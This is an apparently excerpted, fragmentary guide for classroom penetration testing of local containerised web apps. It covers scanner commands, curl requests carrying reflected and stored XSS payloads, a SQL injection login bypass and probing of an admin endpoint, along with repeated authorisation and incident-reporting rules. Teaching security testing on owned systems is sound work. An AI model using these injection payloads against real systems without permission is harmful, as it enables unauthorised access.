...
python src/analyser/penetration_analyser.py http://localhost:5000 --output quick_pentest_assessment.pdf
...
# XSS testing  
curl --get "http://localhost:9090/search" --data-urlencode "q=<script>alert('XSS')</script>"
...
**Authorisation Requirements**: Only test systems you own or have explicit permission to test
...
python src/analyser/penetration_analyser.py --help || echo "Tool not available"
...
- Stop testing if unauthorised access is achieved
...
# Validate SQL injection findings against the Flask target
...
curl -X POST "http://localhost:9090/create_post" \
  ...
  --data-urlencode "content=<script>alert('Stored XSS')</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"
...
# (automated tool limits attempts for safe classroom use)
python src/analyser/pentest_cli.py http://localhost:9090 | grep -i "weak authentication"
...
# Unauthorised administrative and API access
curl "http://localhost:9090/admin"
...
curl -X POST "http://localhost:9090/login" -d "username=admin' OR '1'='1' -- &password=test" >> reports/comparison_analysis.txt
...
- **Permission**: Always obtain written authorisation
...
```bash
# If you accidentally access unauthorised data:
# 1. Stop the activity immediately
# 2. Document what happened
# 3. Report to instructor/supervisor
# 4. Do not access or copy the data
# 5. Follow organisational incident procedures
```
...
# Solution: Restart the containerised applications
...
python src/analyser/dast_cli.py http://localhost:5000 --tools basic_tests --educational
...
6. **Specialisation**: Focus on specific areas (web app security, network
   security, etc.)
